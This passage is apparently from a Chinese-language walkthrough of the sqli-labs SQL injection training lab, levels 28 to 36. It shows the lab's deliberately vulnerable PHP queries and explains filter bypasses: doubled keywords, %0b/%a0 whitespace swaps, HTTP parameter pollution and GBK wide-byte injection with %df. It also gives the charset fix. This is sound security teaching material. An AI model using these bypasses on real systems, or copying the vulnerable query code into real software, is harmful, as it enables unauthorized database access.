&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/union\s+select/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out UNION &amp;amp; SELECT.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;过滤了&lt;code&gt;union空白符select&lt;/code&gt;，可双写绕过，可替换空白符为%0b或%a0绕过&lt;/p&gt;
&lt;h2 id=&#34;less-28a&#34;&gt;Less-28a&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;少了几个过滤规则，其余和Less-28一致&lt;/p&gt;
&lt;h2 id=&#34;less-29&#34;&gt;Less-29&lt;/h2&gt;
&lt;p&gt;index.php // 可以不用管，作者误放了应该&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;普通可注入页面
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;login.php&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$qs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;QUERY_STRING&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$id1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;java_implimentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$qs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;whitelist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;whitelist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;# 匹配数字
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/^\d+$/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;不是数字：&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;重定向到失败页面&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;



&lt;span class=&#34;c1&#34;&gt;# HTTP 参数污染
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;java_implimentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$query_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nv&#34;&gt;$q_s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
	
	&lt;span class=&#34;c1&#34;&gt;# 以&amp;#39;&amp;amp;&amp;#39;为分隔符分割字符串
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nv&#34;&gt;$qs_array&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$q_s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;# 遍历分割好的参数数组
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$qs_array&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
		&lt;span class=&#34;c1&#34;&gt;# 如果前两位是id
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$val&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        	&lt;span class=&#34;c1&#34;&gt;# 从第3位开始，返回长度为30的字符穿
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;			&lt;span class=&#34;nv&#34;&gt;$id_value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id_value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;分析-1&#34;&gt;分析&lt;/h3&gt;
&lt;p&gt;流程：服务端获取到查询字符串&lt;code&gt;id=1&amp;amp;...&lt;/code&gt;，随后截取参数id的值用于白名单过滤，如果匹配数字则继续执行，否则重定向到失败页面&lt;/p&gt;
&lt;p&gt;但是问题出在以下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用于sql查询的id值是通过GET方式获取的，该服务端默认认为从GET方式获取的id值与用于解析白名单过滤的id值是同一个&lt;/li&gt;
&lt;li&gt;对于&lt;code&gt;xxx.php?id=1&amp;amp;id=2&lt;/code&gt;这样的同名参数污染，apache PHP会解析获取最后一个参数值，即为2；tomcat JSP会解析获取到第一个参数值，即为1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此，利用方式如下：?id=1&amp;amp;id=-1&amp;rsquo; union&amp;hellip;..&lt;/p&gt;
&lt;h2 id=&#34;less-30&#34;&gt;Less-30&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-29一致&lt;/p&gt;
&lt;h2 id=&#34;less-31&#34;&gt;Less-31&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;双引号+单括号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-29一致&lt;/p&gt;
&lt;h2 id=&#34;less-32&#34;&gt;Less-32&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;# 转义\
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\\\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# 转义单引号
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/\&amp;#39;/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\\\&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   
    &lt;span class=&#34;c1&#34;&gt;# 转义双引号
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/\&amp;#34;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;                               
      
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SET NAMES gbk&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;绕过-3&#34;&gt;绕过&lt;/h3&gt;
&lt;p&gt;使用 GBK 编码MySQL会认为两个字节为一个汉字，例如 &lt;code&gt;%aa%5e&lt;/code&gt; 即为一个 汉字&lt;/p&gt;
&lt;p&gt;由于转义是在敏感字符前加&lt;code&gt;\&lt;/code&gt;，&lt;code&gt;\&#39;&lt;/code&gt;即%5c%27，那可以在&lt;code&gt;\&#39;&lt;/code&gt;前加上%df，转义后结果为：&lt;code&gt;%df\\\&#39;&lt;/code&gt;，这样MySQL使用GBK会认为%df%5c为一个汉字，即为&lt;code&gt;汉字\\&#39;&lt;/code&gt;，则汉字后的两个反斜杠实际在送往sql语句时表示的仅仅只是一个单纯的反斜杠，不再具有转义作用，此时单引号便起到了闭合作用&lt;/p&gt;
&lt;h2 id=&#34;less-33&#34;&gt;Less-33&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转义方法与Less-32类似&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;绕过方式与Less-32一致&lt;/p&gt;
&lt;h3 id=&#34;补充&#34;&gt;补充&lt;/h3&gt;
&lt;p&gt;gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;MySQL编码机制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nx&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;character_set_client：用户告诉MySQL查询是用的什么字符集。
character_set_connection：MySQL接收到用户查询后，按照character_set_client将其转化为character_set_connection设定的字符集
character_set_results：MySQL将存储的数据转换成character_set_results所设定的字符集发送给用户&lt;/p&gt;
&lt;p&gt;完整可理解为：&lt;strong&gt;MySQL接受到客户端的数据后，会认为他的编码是character_set_client，然后会将换成character_set_connection的编码，然后在进入具体表和字段后，再转换成字段对应的编码，当查询结果产生后，会从表和字段编码转换成character_set_results编码，返回给客户端&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;less-34&#34;&gt;Less-34&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;POST-单引号&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;与Less-33类似&lt;/p&gt;
&lt;h2 id=&#34;less-35&#34;&gt;Less-35&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;拼接点&lt;/th&gt;
&lt;th&gt;可用注入类型&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;直接拼接&lt;/td&gt;
&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;虽然有转义过滤，但是sql语句是直接拼接，所以不需要引号闭合等&lt;/p&gt;
&lt;h2 id=&#34;less-36&#34;&gt;Less-36&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;check_quotes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
